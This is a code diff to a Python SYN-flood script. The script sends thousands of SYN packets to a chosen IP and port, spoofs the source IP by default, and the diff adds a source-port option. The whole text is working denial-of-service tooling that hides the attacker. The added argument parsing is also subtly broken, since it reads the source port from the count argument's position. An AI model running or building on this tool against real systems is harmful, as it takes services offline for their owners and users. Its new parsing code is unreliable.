@@ -3,19 +3,19 @@ import sys
 from single import send_syn, _bool_val
 
 
-def flood(target_ip, target_port, spoof_ip=False, count=10000):
+def flood(target_ip, target_port, spoof_ip=False, count=10000, src_port=None):
     """Flood the target with [count] syn packets"""
     if count == 1:
         print("Sending single syn packet to %s:%s" % (target_ip, target_port))
     else:
         print("Flooding with %d syn packets %s:%s" % (count, target_ip, target_port))
     for i in range(count):
-        send_syn(target_ip, target_port, spoof_ip)
+        send_syn(target_ip, target_port, spoof_ip, src_port=src_port)
     print("Done. Sent %d syn packets" % count)
 
 
 def _help(argv):
-    print("Usage  : python %s target_ip target_port [count:int] [spoof_ip:bool]\n"
+    print("Usage  : python %s target_ip target_port [count:int] [spoof_ip:bool] [src_port:int]\n"
           "Example: python %s 192.168.1.25 8080 1000 true" % (argv[0], argv[0]))
     exit(1)
 
@@ -27,6 +27,7 @@ if __name__ == '__main__':
     target_port = sys.argv[2]
     count = 10000
     spoof_ip = True
+    src_port = None
     if len(sys.argv) > 3:
         try:
             count = int(sys.argv[3])
@@ -41,4 +42,10 @@ if __name__ == '__main__':
                 spoof_ip = True
             else:
                 _help(sys.argv)
-    flood(target_ip, target_port, spoof_ip=spoof_ip, count=count)
+    if len(sys.argv) > 5:
+        try:
+            src_port = int(sys.argv[3])
+        except:
+            _help(sys.argv)
+
+    flood(target_ip, target_port, spoof_ip=spoof_ip, count=count, src_port=src_port)
